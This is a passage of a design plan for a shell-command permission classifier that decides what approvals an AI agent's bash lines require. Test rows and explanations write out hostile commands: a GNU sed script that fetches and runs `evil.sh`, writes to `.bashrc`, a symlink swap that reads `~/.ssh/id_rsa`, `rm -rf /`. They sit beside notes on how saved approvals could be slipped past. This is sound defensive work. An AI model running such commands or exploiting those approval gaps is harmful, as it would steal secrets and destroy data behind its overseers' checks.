**The hardest question:** whether `git grep` on a ref is truly covered by `std::git::show`. The review doubted it, because the search reads every file in a commit. It is covered, by a rule that already exists: `git show main:src/index.ts` asks `std::git::show { ref: "main:src/index.ts" }` today, and an approval of `std::git::show` is scoped by `cwd`, not by `ref`. So an approval of `std::git::show` in a repository already covers reading any file of any commit there. The `git grep` row stays.

**Files:**
- Modify: `stdlib/safeBash.agency`: `gitEffects`, `GIT_VERBS`, `gitPayloads`, `gitCommand`
- Test: `tests/agency/safeBash.agency`

### Task 2.1: flags before the subcommand

**Interfaces:**
- Produces: `def gitLeadingFlags(words: Word[], cwd: string): Result<GitLead>` with `type GitLead = { cwd: string; rest: Word[] }`. It reads `--no-pager` and `-C <dir>` from the front of the words. `-C` resolves its folder with `cdTarget`'s rules: one literal argument that names an existing folder. Any other leading flag fails with the existing message, "the git subcommand is not a plain word".
- `gitEffects` calls it first and uses `lead.cwd` for every payload. `gitCommand` writes `-C '<absolute real folder>'` after the fixed flags when the folder changed. `--no-pager` is never written.

- [ ] Test node `gitLeadingFlagRows`: `git --no-pager log --oneline -5` asks `std::git::log` with the launch `cwd`. `git -C sub status` asks `std::git::status` with `cwd` the real `sub`. `git -C $X status`, `git -c a=b status`, and `git --git-dir=x status` stay broad.
- [ ] Extend `gitRunsWhatItAsked` with the text each of the first two runs.
- [ ] Implement.

### Task 2.2: `--format` and `--pretty`

- [ ] Add `--format` and `--pretty` to the valued flags of `log` and `show` in `GIT_VERBS`. Set `quotedValues` on those two rows, so Task 1.1's `joinedFlag` reads the quoted form. If PR 1 has not merged, this PR carries Task 1.1. `gitCommand` writes a long flag's value as part of the flag word and the printer quotes it, so check in `gitRunsWhatItAsked` that `--format="%h %s"` runs as one quoted word.
- [ ] Delete the "`--format` and `--pretty`" bullet from the comment above `GIT_VERBS`.
- [ ] Test rows in `gitReads`: `git log -5 --format=%s`, `git log --format="%h %s" -3`, `git show --pretty=fuller HEAD`.

### Task 2.3: the mapped subcommands

One row or one small function each, following Decision 7's table. All are reads, so none changes `gitStaysBroad`'s write rows.

**Interfaces:**
- `rev-parse`: a function `gitRevParseRule`, because what it asks depends on its flags. Exactly one ref, with no flag or with any of `--short`, `--abbrev-ref`, `--verify`, asks `log { cwd, ref, path: "" }`. Flags `--show-toplevel`, `--git-dir`, `--is-inside-work-tree` with no ref ask `status { cwd }`. A mix of the two groups, or any other flag, has no rule.
- `merge-base`: a `GIT_VERBS` row with no flags and exactly two refs. `gitPayloads` returns two `log` effects.
- `ls-files`: a row with flags `--modified`, `--deleted`, `--cached`, `--others`, and `--exclude-standard`, and at most one path that names a folder. It asks `std::ls { dir, recursive: true, maxResults: 0 }`. `--others` and `--exclude-standard` are allowed only together. `--others` alone lists every ignored file, `node_modules` included, which is a very long listing and not what a model means. It prints names under skipped folders such as a tracked `dist`. That is within what a recursive `std::ls` through bash already covers: real `ls -R` prints those names too, and the dev doc's "What a recursive listing shows" records that decision.
- `worktree`: a function that takes only the word `list` and the flag `--porcelain`. `worktree add` and `worktree remove` have no rule.
- `grep`: a function `gitGrepRule`. Flags `-n -i -l -w -E -F -c`. With no ref, each path after `--` asks `std::grep` for that folder, or the working folder when there is none. With one ref before `--`, it asks `show { cwd, ref }`. In the form with no ref, a repository may track files under `dist` or `build`, which the grep tool never reads. So `gitCommand` writes two exclude pathspecs per skipped name after the model's paths: `':(exclude,glob)**/<name>/**'` for a folder and `':(exclude,glob)**/<name>'` for a file. With no path from the model it writes `.` first, because git needs one positive pathspec beside an exclude. `--no-index`, `-O`, and `--open-files-in-pager` are not on the list, because the first reads outside the repository and the other two run a program.

- [ ] Test node `gitMappedReads` with one row per line of Decision 7's table, giving the effect names and the payload's `ref` or `dir`.
- [ ] Add to `gitStaysBroad`: `git rev-parse --show-toplevel HEAD`, `git worktree add x`, `git grep --no-index x`, `git grep -O x`, `git ls-files --others`.
- [ ] Extend `gitRunsWhatItAsked` with `git grep -n x main -- src`, which must run with the `--` in place.
- [ ] In `gitMappedReads`, add the bare `git rev-parse HEAD`, and `git ls-files --others --exclude-standard`.
- [ ] In `gitRunsSafely`, which makes its own repository: commit a file `dist/x.js` that holds the search word, and check that `git grep` of that word through `safeBash` does not print it. The same test checks that the exclude pathspec is valid on the git that macOS ships and on CI's.
- [ ] Implement.

## PR 3: quiet commands, wrappers, assignments, `/dev/null`

**The hardest question:** Decision 2, what a line of only quiet commands asks.

**Files:**
- Modify: `stdlib/safeBash.agency`: `verbEffects`, `execEffects`, `simpleCommandRule`, `redirectEffect`, `pipedProgram`, `planLine`, `gitCommand`, `ghCommand`
- Modify: `stdlib/effectSets.agency`: the `Shell` set, if Task 3.5 is built
- Modify: `stdlib/safeBash/actions.agency`: the new effect
- Modify: `stdlib/shell.agency`: the effect declaration
- Modify: `lib/runtime/builtinPolicies.ts`: one rule
- Test: `tests/agency/safeBash.agency`, `lib/runtime/builtinPolicies.test.ts`

### Task 3.1: the tarsec pin and `$?` (its own small PR, 3a)

This task is the only one that waits on the tarsec publish. It ships by itself, so the rest of PR 3 does not wait. Files: `package.json`, `../../pnpm-lock.yaml`, and the two test files.

- [ ] Bump the pin to the published version.
- [ ] Test node `exitStatusInEcho`: `pnpm test; echo "exit=$?"` is narrow with one `std::exec`. `cat $?` is broad. A lone `echo "exit=$?"` follows Task 3.5.
- [ ] Add a round-trip row for `echo "exit=$?"` to `lib/stdlib/safeBash.test.ts`.

No classifier change is expected. If the first row fails, the cause is a rule that reads the word, and the fix belongs in that rule.

### Task 3.2: quiet commands

**Interfaces:**
- Produces: `static const QUIET_VERBS: Record<string, FlagSpec>` in `stdlib/safeBash.agency`, and a `verbEffects` step before `otherVerbEffects`: a verb in the table whose words pass its row returns `success(redirects)`.

| Verb | Flags | Words |
|---|---|---|
| `pwd` | `-P -L` | none |
| `true`, `false`, `:` | none | any |
| `printf` | none | the first word is literal and does not start with `-`; every other word is literal or `$?` |
| `basename`, `dirname` | none | literal |
| `sleep` | none | one word of digits |
| `date` | `-u` | at most one word that starts with `+` |
| `uname` | `-a -s -r -m` | none |
| `whoami`, `hostname` | none | none |
| `which` | `-a` | literal names, none with the last path segment `agency` |
| `type` | none | the same |
| `command` | `-v` only, and it is required | the same |

The `printf` row reads the text of its first word, not its tag. The parser reads `"-v"` as a quoted word and not as a flag, and bash still takes it as the option once the quotes are gone. `refuseQuotedOption` already makes this check for grep.

`pwd`, `true`, `false`, `:`, `printf`, `type`, and `command` are in `BUILTIN_VERBS`. The quiet step runs before `execEffects`, so the builtin refusal is never reached for a spelling the table accepts. A spelling it does not accept, such as `command ls` or `hostname newname`, falls through to today's refusal.

`which` and `whereis` stay in `NO_EXEC_PROGRAMS`. The quiet step runs first, so a `which` the table accepts never reaches the list, and `which agency; ls` and `which node_modules/.bin/agency` fall through to it and ask `std::bash` with no extra code.

- [ ] Test node `quietCommandsAskNothing`: `pwd; ls src` is narrow with one `std::ls`. `which node && node --version` is narrow with one `std::exec`. `command -v gtimeout; ls` is narrow. `which agency`, `which node_modules/.bin/agency; ls`, `command ls`, `hostname x`, `date -s 1`, and `sleep $N` are broad. So are `printf -v PATH x; ls`, `printf "-v" PATH x; ls`, `printf $F x; ls`, and `printf "$GITHUB_TOKEN"; ls`. `printf 'a\n'; ls` and `printf "exit=$?\n"; ls` are narrow.
- [ ] Implement.

### Task 3.3: `timeout`

**Interfaces:**
- Produces: `def unwrapTimeout(command: SimpleCommand): SimpleCommand | null`. It returns the inner command when the verb is `timeout` or `gtimeout`, which is the name coreutils gives it on macOS, the first argument is a word of digits with an optional `s`, `m`, or `h`, and at least one word follows. The inner command's verb is that next word.
- `simpleCommandRule` calls it after its four checks. When it returns a command, the rule classifies that command and puts `timeout <duration>` back in front of the command it returns. The assignments go in front of `timeout`, never after it. They come from two places: the ones the model wrote before `timeout`, and the ones the inner rule added, such as the `GH_HOST=github.com` that `ghCommand` puts on a search. `timeout 5 GH_HOST=github.com gh …` would make `timeout` look for a program called `GH_HOST=github.com`. When the inner rule returns anything other than a simple command, as a `git diff` does, the line has no rule.

- [ ] Test node `timeoutReadsThrough`: `timeout 60 pnpm test` asks `std::exec` with `command: "pnpm"`. `timeout 5 cat one.txt` asks `std::read`. `gtimeout 60 pnpm test` asks the same. `timeout -s KILL 5 pnpm test`, `timeout 5 timeout 5 ls`, and `timeout 5 git diff` are broad.
- [ ] Test the text that runs for two rows: `TERM=dumb timeout 60 pnpm test` runs as written, and `timeout 5 gh search issues crash --repo o/r` runs as `GH_HOST=github.com timeout 5 gh search issues …`.
- [ ] Unwrap in one place. The refuse wall reads the flat list from `flattenOne`, and the classifier reads the tree through `classifySimple`. Both must see the inner command, and a third reader added later must not be able to forget. So `flattenOne` returns the inner command for a `timeout`, and `classifySimple` unwraps before it calls `simpleCommandRule`. Neither `isRefused` nor any verb rule knows the word `timeout`. If this does not fit the two functions cleanly, stop and bring it back.
- [ ] Add `timeout 5 rm -rf /`, `timeout 5 shred x`, and `timeout 5 git reset --hard` to the refusal tests. Each must be refused.
- [ ] Build this task last in the PR.
- [ ] Implement.

### Task 3.4: assignments and `/dev/null`

**Interfaces:**
- Produces: `static const QUIET_ASSIGNMENTS: string[]` with the ten names from Decision 3. `simpleCommandRule` fails on an assignment when its name is not in the list, or when its value is not a literal made of letters, digits, and `. _ - :`.
- `gitCommand` sets `assignments: []` and `ghCommand` sets its own list, so both drop what the model wrote. Each now puts the model's quiet assignments first and its own after them.
- `redirectEffect` drops an input redirect whose literal target is `/dev/null`, and treats `&>` to `/dev/null` as it treats `>` to `/dev/null`. `pipedProgram` ignores the same input redirect.

- [ ] Test node `quietAssignmentsAndNull`: `TERM=dumb pnpm test` asks one `std::exec`. `NO_COLOR=1 LC_ALL=C pnpm test` asks one. `tv --help </dev/null` asks one. `pnpm test &>/dev/null` asks one. `PATH=/tmp pnpm test`, `TERM=$X pnpm test`, `NODE_OPTIONS=x pnpm test`, `CI=1 pnpm test`, `TZ=/etc/passwd date`, `pnpm test &>out.txt`, and `cat < /dev/null` are broad. The last is broad because `cat` with no path and no pipe reads a closed stdin, as today.
- [ ] Test that the assignment survives the rebuild: `TERM=dumb git status` runs with `TERM=dumb` in front of the git command safeBash wrote, and `NO_COLOR=1 gh search issues crash --repo o/r` runs with `NO_COLOR=1 GH_HOST=github.com` in front of the `gh` command.
- [ ] Implement.

### Task 3.5: a line of only quiet commands (after Decision 2)

**Interfaces (option A):**
- `effect std::bash::readonly { command: string; cwd: string }` with `@always(command, cwd)`, declared in `stdlib/shell.agency` beside `std::bash`.
- The change is in `planLine`, not in `bashPlan`. A line whose commands raise no effect never reaches `bashPlan`: `planLine` sees the empty list first and returns `broadPlan(source, verbs, { kind: "noEffects" })` (`stdlib/safeBash.agency:4162`). That branch now has two outcomes. When every word in the line is literal, it rebuilds the tree, as the narrow path below it does, and returns a plan with the one effect `std::bash::readonly` and a null `broadReason`. Otherwise it returns the broad plan, as today.
- `savedOutputLine` already computes "every word is literal" as `SavedOutputLine.literal`, using `isLiteralWord`. A `$?` word counts as literal for this check only, so the check needs its own small predicate beside `isLiteralWord`, not a change to it.
- Two lines that are not made of quiet commands also reach this branch today: a lone `cd x`, and `echo hi | grep h`. Both would ask the new question. That is correct for both, since neither reads a file nor changes one, but the question's wording must fit them. Use "Run this line, which reads and changes no file?".
- `stdlib/effectSets.agency`: the `Shell` set gains `std::bash::readonly`. A person who runs with `--reject Shell` expects no shell to start, and this effect starts one.
- `SafeBashEffects` gains the effect. `raiseOne` gains an arm with the message "Run these commands, which only print?".
- `recommendedAutoApprovePolicy` gains `"std::bash::readonly": approve`.
- `outcomeOf` reports such a plan as `narrow`.

A saved policy does not follow `recommended`. A person who already has `~/.agency-agent/policy.json` gets the new rule only when they run `/policy` and say yes. Until then a lone `pwd` asks them the new question. The PR description must say this.

- [ ] Test node `quietLinesAskTheQuietQuestion`: `pwd`, `echo "---"`, `which node; date`, and `echo "exit=$?"` each ask `std::bash::readonly`. `echo $HOME` asks `std::bash`.
- [ ] The same node: a lone `cd lib` and `echo hi | grep h` ask `std::bash::readonly`, and each runs the rebuilt text.
- [ ] Test in `lib/runtime/builtinPolicies.test.ts` that `recommended` approves it and `minimal` does not.
- [ ] Test that a run with `--reject Shell` under `recommended` rejects a lone `pwd`.
- [ ] Implement.

## PR 4: file commands raise file effects

**The hardest question:** what `cp` and `mv` write when the destination is an existing folder. The payload must name the file that is created, not the folder.

**Files:**
- Modify: `stdlib/safeBash.agency`: `otherVerbEffects`, `READ_VERBS`, `LIST_VERBS`, new tables
- Modify: `stdlib/safeBash/actions.agency`: effect constructors for `std::mkdir`, `std::copy`, `std::move`
- Modify: `stdlib/safeBash.agency`: `raiseOne`, `SafeBashEffects`, `accessesOf`'s caller list
- Test: `tests/agency/safeBash.agency`

### Task 4.1: `mkdir` and `touch`

**Interfaces:**
- `static const MAKE_VERBS: Record<string, FlagSpec>`: `mkdir` takes `-p -v`, `touch` takes none. Both set `optionsFirst`.
- `def makeEffects(verb, command, cwd, spec, redirects): Result<Effect[]>`, modeled on `removeEffects`. Each path is literal. `touch` resolves its path with `_resolveRedirectTarget`, the resolver `>` uses, and asks `std::write { dir, filename, content: "", mode: "append" }`.
- `mkdir` needs the real path of a folder that may not exist yet. The `mkdir` tool gets it from `_realTarget`, which is `host.files.realPath` (`stdlib/fs.agency:132`). safeBash already wraps that call for `rm` as `_removeTargetIn(text, cwd, tildeMode)` in `lib/stdlib/safeBashRemove.ts`. Rename it `_realPathIn`, since it no longer serves only removal, and call it here. `mkdir` then asks `std::mkdir { dir }` with the path the tool itself would put in its payload. Do not add a second resolver.
- `realPath` handles a path with several missing steps. Its walker, `walkSpelling` in `lib/host/node/nodeFiles.ts`, resolves each step that exists, keeps every step after the first missing one as written, and fails on a dangling link. Pin that with a unit test for `a/b/c` when `a` is missing, and when `a` is a symlink to a folder.
- `_removeTargetIn` passes the label `"rm"` to `resolveAgainstCwd` for its error text. `_realPathIn` takes the label as a parameter.

- [ ] Test node `makeAsksLikeTheTools`: `mkdir -p a/b` asks one `std::mkdir` whose `dir` ends in `/a/b`. `mkdir a b` asks two. `touch x.txt` asks `std::write` with empty content and append mode. `mkdir -m 700 a`, `mkdir $X`, and `touch -t 0101 x` are broad.
- [ ] Test under the `with-writes` policy for the fixture folder: `mkdir -p tmp/x` is approved, and `mkdir -p /usr/local/x` is not.
- [ ] Implement.

### Task 4.2: `cp` and `mv` (waits; only the first step below is built now)

**Built now:** add `cp`, `mv`, and `ln` to `NO_EXEC_PROGRAMS`. `ln` is there for PR 5: a saved rule for `ln -sf` would let a line replace a file with a link to another one, under an approval that names neither (see Task 5.3). Test row: `ln -s a b` is broad.

For `cp` and `mv`: Today "always approve" for `cp package.json /tmp/x` saves the pair `cp` and `package.json`, and the same answer for `mv -f a b` saves `mv` and `-f`, which covers every forced move on the machine. With both names in the list, a `cp` or `mv` line asks `std::bash`, which shows the whole line and saves only that exact line. Test rows: `cp a b` and `mv a b` are broad with the reason "no rule for `cp`".

**Why the full rule waits.** It has six things to get right, and no logged session ran either command:

1. Where the file lands depends on the disk. `cp a b` writes `b` when `b` is not a folder, and `b/a` when it is. The payload must name the file that is created.
2. Several sources. `cp a b c` is valid only when `c` is a folder, and it is one effect per source.
3. A symlink as the source. `cp` copies what the link points at, and `mv` moves the link itself.
4. A folder that holds symlinks. What `cp -r` does with them has to be checked on BSD and GNU before the rule can claim a payload.
5. `mv` deletes its source. So it needs the refusals `rm` has: `mv . /tmp/x` and `mv ~ x` must never get a `std::move` that a policy could approve.
6. The payload has to match what the `copy` and `move` tools raise for the same paths, or a policy rule written for the tools means something else here.

The design below is kept for the follow-up.

**Interfaces:**
- `static const COPY_VERBS: Record<string, FlagSpec>`: `cp` takes `-r -R -p -f -v`, `mv` takes `-f -v`. Left out, each with its reason in the comment: `-a` and `-L` change what happens to symlinks, `-n` and `-i` change whether the write happens, and `-t` reorders the operands.
- `def copyEffects(verb, command, cwd, spec, redirects): Result<Effect[]>`. The last positional is the destination. Each source must exist and is resolved with `resolveTarget`. A source folder needs `-r` or `-R` for `cp`.
  - Destination is an existing folder: one effect per source, with `dest` the folder's real path joined with the source's own name.
  - Destination is not an existing folder: exactly one source is allowed, and `dest` is `_realPathIn` of the destination, the same call the `copy` tool makes on its `dest`.
- A source whose last step is a symlink has no rule. `cp` copies the target and `mv` moves the link, and one payload cannot say both.
- `copyEffects` runs the same refusal `removeEffects` runs on a `mv` source, because a move deletes its source: `_removeRefusal(source, cwd)`.

- [ ] Test node `copyAndMoveAskLikeTheTools`, with payloads: `cp one.txt two.txt`, `cp one.txt sub` where `sub` is a folder (dest ends in `/sub/one.txt`), `cp -r sub sub2`, `mv one.txt sub/`, `cp a b sub`. Broad: `cp sub sub2` with no `-r`, `cp a b c` where `c` is not a folder, `cp -a x y`, `cp link.txt y`, `mv . /tmp/x`.
- [ ] Test `copyUnderWithWrites`: both paths in the fixture folder are approved, and `cp one.txt /tmp/x` is not, because `with-writes` requires both `src` and `dest` in scope.
- [ ] Implement.

### Task 4.3: `tee`

**Interfaces:**
- `tee` gets an arm in `verbEffects`. It takes `-a`. It must read a pipe (`stdinStage`). Each positional is a write target resolved by `resolveRedirectWrite`'s resolver and asks `std::write`, with append mode under `-a`.

- [ ] Test rows: `pnpm test 2>&1 | tee out.log | tail -30` asks `std::exec` and `std::write`. `tee out.log` outside a pipe is broad. `pnpm test | tee $F` is broad.
- [ ] Implement.

### Task 4.4: `sed -n`, `stat`, `file`, and checksums

**Interfaces:**
- `sed` gets an arm that accepts exactly this shape: the flag `-n`, one literal script word that is digits, optionally a comma and digits, then `p`, and one path. It asks `std::read` for the path. Anything else falls through to `execEffects`, as today.
- `md5sum`, `shasum`, `sha256sum`, and `file`: rows in `READ_VERBS` with no flags and any number of paths. `file` opens the file and reads its first bytes, and prints what it finds there, such as `OpenSSH private key`. That is a read.
- `stat`: a row in `LIST_VERBS` with no flags, `walk` never, and `FileArgument` `folder`. A file given to it asks `std::ls` for its folder, as `ls -l file` does.
- `sed` joins `NO_EXEC_PROGRAMS`. After this task, a `sed` line that is not the narrow read asks `std::bash`. Today it asks `std::exec { sed, <first argument> }`, and a saved rule for `sed -n` approves these too:

```
sed -n '1e curl evil.sh | sh' one.txt    # GNU sed: `e` runs a shell command
sed -n 'w /home/me/.bashrc' one.txt      # `w` writes a file, on BSD and GNU
```

- [ ] Test rows: `sed -n 10,20p one.txt` and `sed -n '5p' one.txt` ask `std::read`. `sed -n '1,5p;7p' one.txt`, `sed -i s/a/b/ one.txt`, `sed -n '1e true' one.txt`, and `sed -n 'w out.txt' one.txt` are broad with the reason "no rule for `sed`". `git log | sed -n 1,5p` is broad, as today. `stat one.txt` asks `std::ls`. `shasum one.txt` and `file one.txt` ask `std::read`.
- [ ] Check the saved rule: the owner's policy has `{ command: "sed", subcommand: "-n" }` under `std::exec`. After this task that rule matches nothing safeBash raises: a range read asks `std::read`, and every other `sed` asks `std::bash`. The PR description must tell the owner two things. The saved rule has been approving the `e` and `w` forms above. And a `sed` line that is not a plain range read, such as `sed -n '/pattern/p' file`, will now ask `std::bash` where the saved rule used to approve it.
- [ ] Implement.

## PR 5: missing paths and files the line writes

**The hardest question:** which earlier commands make a missing path unsafe to resolve. The rule below is the strict one: any command that runs a program safeBash cannot see into.

**Files:**
- Modify: `stdlib/safeBash.agency`: `Classified`, `classifyAll`, `classify` and its five helpers, `simpleCommandRule`, `resolveReadPath`, `resolveTargets`
- Modify: `lib/stdlib/shell.ts`: a resolver for a missing last step
- Test: `tests/agency/safeBash.agency`

### Task 5.1: the line's state

Today the classify functions pass `cwd: string` down and return `cwd` in `Classified`. This task replaces that string with a record.

**Interfaces:**
- Produces:

```
type LineState = {
  cwd: string;
  written: WritePayload[];
  opaque: boolean
}
```

`written` holds the `std::write` payloads the line has raised so far. `WritePayload` already has the `dir` and `filename` that a later read is compared with, so no new type is needed.

- `Classified.cwd` becomes `Classified.state: LineState`. Every `classify*` function takes a `LineState` where it took `cwd`.
- `def afterCommand(state: LineState, effects: Effect[]): LineState`. It adds the payload of every `std::write` effect to `written`. It sets `opaque` unless every effect is a read effect or a `std::write`. The read effects are the existing `READ_EFFECTS` list, plus a second list that names each git and GitHub read one by one: `std::git::status`, `log`, `diff`, `show`, `blame`, `branchList`, `remoteList`, `stashList`, and the eleven `std::github` reads in the `GithubRead` set. The list is by name and never by prefix. `git checkout` and `git stash pop` are `std::git::*` effects too, and either can put a symlink that a commit holds into the working folder. The rule is written this way round on purpose: an effect added to safeBash later sets `opaque` until someone decides it is safe, where a list of dangerous effects would let it through.
- A pipeline's stages run at the same time. So the state a stage is classified in is the state before the pipeline, and the state after the pipeline is `afterCommand` applied over all its stages.
- Parentheses reset `cwd`, as today. They do not reset `written` or `opaque`, because a file a subshell writes is still there afterwards.

- [ ] This task changes no behavior. Run the whole `safeBash.agency` test file before and after, and compare the two outputs.

### Task 5.2: a missing path resolves by its parent

**Interfaces:**
- Produces: `def missingTarget(text: string, word: Word, cwd: string): Result<WritePayload>` in `stdlib/safeBash.agency`. It calls `_resolveRedirectTarget`, the resolver `>` already uses for a file that does not exist yet, which returns the real parent folder and the name. It adds two checks. The path must be missing. And the parent must be a folder that exists: `_resolveRedirectTarget` accepts a missing parent, because its walker keeps every step after the first missing one as written, so without this check `cat nodir/nope.txt` would resolve. Using the redirect's own resolver means a read and a write of the same new file get the same `dir` and `filename`, which Task 5.3 depends on.
- `resolveReadPath` and `resolveTargets` gain a `state: LineState` parameter. When `resolveTarget` fails because the path is missing:
  - If `state.opaque` is true, fail as today.
  - Otherwise call `missingTarget`. A read verb gets a `disk` source for that file. A listing verb whose row says a file asks for its folder gets that folder, with `recursive: false`.
- `find`, `tree`, `grep -r`, `diff`, `cmp`, and an input redirect do not use the new path. Each needs a real folder or two real files.

- [ ] Test node `missingPathsResolveByParent`:

| Command | Outcome | Effects |
|---|---|---|
| `cat nope.txt` | narrow | `std::read` |
| `ls nope 2>/dev/null \|\| echo missing` | narrow | `std::ls` |
| `ls -la one.txt nope.txt` | narrow | `std::ls` (one, merged) |
| `cat nodir/nope.txt` | broad | `std::bash` |
| `find nope -name x` | broad | `std::bash` |
| `pnpm build && cat out.txt` with `out.txt` missing | broad | `std::bash` |

- [ ] Test node `missingPathAfterAProgramIsBroad` (Review Focus 2): `ln -s /etc/hosts x; cat x`, `mkdir x; ls x`, `cp one.txt y; cat y`, and `ln -sf /etc/hosts out.txt > out.txt; cat out.txt` are all broad.
- [ ] A lone `cat nope.txt` used to go to bash. Check that `tryShellFreeRead` still refuses it, so it runs real `cat` and the model reads cat's own error.
- [ ] Implement.

### Task 5.3: a file the line wrote

**Interfaces:**
- In `resolveReadPath`, before the `opaque` check: when the path is missing and `missingTarget` returns a `dir` and `filename` that match an entry of `state.written`, resolve to it even when `state.opaque` is true.

safeBash knows the file will exist, because the redirect creates it as its command starts. It does not know the file will still be the one the redirect created. This line shows why:

```
ln -sf ~/.ssh/id_rsa out.txt > out.txt; cat out.txt
```

The redirect creates `out.txt`, then `ln -sf` replaces it with a link to the key, and `cat` reads the key under a `std::read` that names `out.txt`.

The rule is still safe, for this reason. The program between the write and the read was approved by a person or a policy. A general program, such as `pnpm test` or `node x.js`, can already read any file itself and print it, so swapping a file adds nothing to what its approval gave. A swap adds something only for a program that does one narrow thing, where a person would approve it without thinking of file reads. `ln` is that program, and after Task 4.2 it asks `std::bash`, so the line above is broad. `cp` and `mv` ask `std::bash` for the same reason. A new narrow program that can replace a file must be added to `NO_EXEC_PROGRAMS` before it gets any rule. Put that sentence in the comment above the list.

The same swap is possible today for a path that exists when the plan is made, as in `ln -sf ~/.ssh/id_rsa one.txt; cat one.txt`. Task 4.2 closes that one as well.

- [ ] Test node `readsOfFilesTheLineWrote`: with a handler that approves everything, each of these is narrow, and the effect list is as given.
  - `gh pr diff 1 --repo o/r > /tmp/x.diff 2>&1; wc -l /tmp/x.diff` asks `std::github::prDiff`, `std::write`, `std::read`.
  - `pnpm test > out.txt 2>&1; tail -50 out.txt` asks `std::exec`, `std::write`, `std::read`.
  - `tail -5 out.txt; pnpm test > out.txt` with `out.txt` missing: the read comes first, and nothing opaque ran before it, so it is narrow by Task 5.2's rule.
  - `pnpm test > out.txt | cat out.txt`: the write is in the same pipeline, so it is broad.
- [ ] Delete the paragraph in the dev doc that says the read family refuses a missing path, and write the new rule under "Resolving the path when the plan is made".
- [ ] Implement.

## PR 6: globs (follow-up, not built in this round)

This section is the design for later. What makes it more than a table row:

1. safeBash has to do what bash does: `*`, `?`, and `[...]` per path segment, dot files, sort order, and what happens when nothing matches. That is a second implementation of part of bash, with a parity test to keep the two in step.
2. Each file the glob names needs its own check, because one of them may be a symlink to a file outside the folder.
3. The command that runs is rewritten with the file list in it.
4. It changes the first rule in the dev doc, that safeBash never expands anything itself.
5. It builds on PR 5's rule for a pattern that matches nothing.

**The hardest question:** matching bash's expansion closely. Task 6.1's parity test is the answer.

**Files:**
- Create: `lib/stdlib/bashGlob.ts`, `lib/stdlib/bashGlob.test.ts`
- Modify: `stdlib/safeBash.agency`: `readFileVerb`, `listEffects`, `readGrep`
- Modify: `lib/stdlibCapabilities.test.ts` if the new bridge needs an allow-list entry
- Test: `tests/agency/safeBash.agency`

### Task 6.1: the expander

**Interfaces:**
- Produces: `_expandBashGlob(pattern: string, cwd: string): Promise<string[]>`. It returns the matching paths as bash would write them, relative when the pattern is relative, sorted by code point. It returns `[]` for no match. It throws for `**`, for a brace, and for more than `BASH_GLOB_CAP` matches, which is 200.
- Matching is per segment: `*` and `?` never match `/`, and never match a leading dot unless the pattern segment starts with a dot. `[...]` supports ranges and a leading `!` or `^`.
- It reads folders through the host's file interface and never follows a symlink to list a folder. A segment that is a symlink to a folder is matched by name and not descended into.

- [ ] Unit tests in `bashGlob.test.ts` over a temp tree: `*.ts`, `lib/*.ts`, `*/a.ts`, `.*`, `a?.txt`, `[ab].txt`, `[!a].txt`, a pattern with no match, a folder symlink in the middle of a pattern.
- [ ] Parity test: for each pattern above, run `bash -c 'printf "%s\n" <pattern>'` in the same tree and compare the lists after sorting both. Skip the no-match row, where bash prints the pattern.

### Task 6.2: the read verbs, the listing verbs, and grep paths

**Interfaces:**
- Produces: `def expandGlobs(words: Word[], cwd: string): Result<Word[]>`. Each glob word becomes one single-quoted word per match. A glob with no match becomes one single-quoted word holding the pattern. Every other word is returned as it was.
- `readFileVerb`, `listEffects`, and `readGrep` call it on their positionals before resolving them, and return the rewritten command. `otherVerbEffects` therefore returns a `SimpleRule` for these verbs, as the grep arm does after PR 1.
- Each expanded word then goes through the verb's normal resolver. So a match that is a symlink to a file outside the folder asks `std::read` for the real folder, and a no-match pattern follows PR 5's missing-path rule.

- [ ] Test node `globsExpandToFiles`: `wc -l lib/*.ts` in the read fixtures asks one `std::read` per file and runs the quoted list. `ls *.txt` asks one merged `std::ls`. `grep -n hello *.txt` asks one `std::grep` per file. `ls *.nomatch 2>/dev/null` asks `std::ls` for the folder. `cat **/*.md` and `rm *.txt` are broad.
- [ ] Test node `globMatchThatIsALinkAsksForTheRealFolder` (Review Focus 1): a fixture folder holding a symlink `secret.txt` to a file outside. `cat *.txt` must include a `std::read` whose `dir` is the outside folder.
- [ ] Rewrite the first rule in the dev doc: safeBash never expands a variable, and it expands a glob only to write the result into the command it runs.
- [ ] Implement. Close ADI-247.

## PR 7: "always approve all writes in" (follow-up, not built in this round)

This PR does not touch safeBash. It is here because point 9 asked for it. It waits for its own design, and the notes below are a starting point.

**Files:**
- Modify: `stdlib/effectSets.agency`: a new set
- Modify: `lib/runtime/alwaysChoices.ts`: `SHARED_APPROVAL_SETS`, and where `matchDotFolders` is decided
- Modify: `lib/runtime/interruptPromptOptions.ts`: `withScopedRule`
- Test: `lib/runtime/alwaysChoices.test.ts`, `lib/typeChecker/alwaysTag.stdlib.test.ts`
- Docs: `docs/dev/agents/approval-policies.md`, "Effect sets that get broader answers"

**Interfaces:**
- `export effectSet FileWriteInFolder = <std::write, std::edit, std::mkdir>`. `FileWrite` is unchanged.
- `SHARED_APPROVAL_SETS` gains `FileWriteInFolder: "all writes"`.
- Today a listed set gets three things together: the `as` answer, the folder step, and `matchDotFolders`. This PR splits the third from the first two. `SHARED_APPROVAL_SETS` values become `{ phrase: string; matchDotFolders: boolean }`, and the new set has `false`.

- [ ] Test: at a `std::write` prompt in `/p/src`, the options include "always approve all writes in". Picking `/p` saves a rule under `std::write`, `std::edit`, and `std::mkdir`, each without `matchDotFolders`.
- [ ] Test: with those rules saved, a write in `/p/.git/hooks` is not approved.
- [ ] Test: the rule lands after the `ownPolicyFileRules` propagate rules, so a write to `policy.json` still asks. `insertApproveRule` places a rule after the last reject, not after a propagate, so check this case by hand and add a test for what it does.
- [ ] `std::writeBinary` shares `std::write`'s scope. Decide in review whether it joins the set. The `alwaysTag.stdlib.test.ts` check fails if a listed member's scope disagrees, so adding it is safe to try.

---

# Part 4. What this buys

Replaying the 51 broad lines against the rules in this plan:

| After | Broad lines left, of 51 |
|---|---|
| Today | 51 |
| PR 3 | 37 |
| PR 1 | 34 |
| PR 2 | 27 |
| PR 5 | 23 |
| `find` flags and globs, which no PR above fully covers | 16 |

The counts are from tags on each line, not from running the new rules, so treat them as estimates. The committed corpus test from PR 1 gives the real number after each merge.

So the PRs in this plan take the 51 down to about 23. Of those 23, 16 are the lines Part 2, point 10 sets aside, and 7 need the `find` rules below or a glob beside another blocker.

`find` with `-newermt`, `find` with `\( \)`, and a `find` whose folder is a symlink account for 4 lines. They are small and are not in a PR above. `-newermt` is one flag row. The other two need a parser change and a decision about linked folders.

# Part 5. Not in this plan

- An operating-system sandbox for the lines no rule can describe.
- `git fetch`, which needs a new effect.
- `npx`, which stays without a rule.
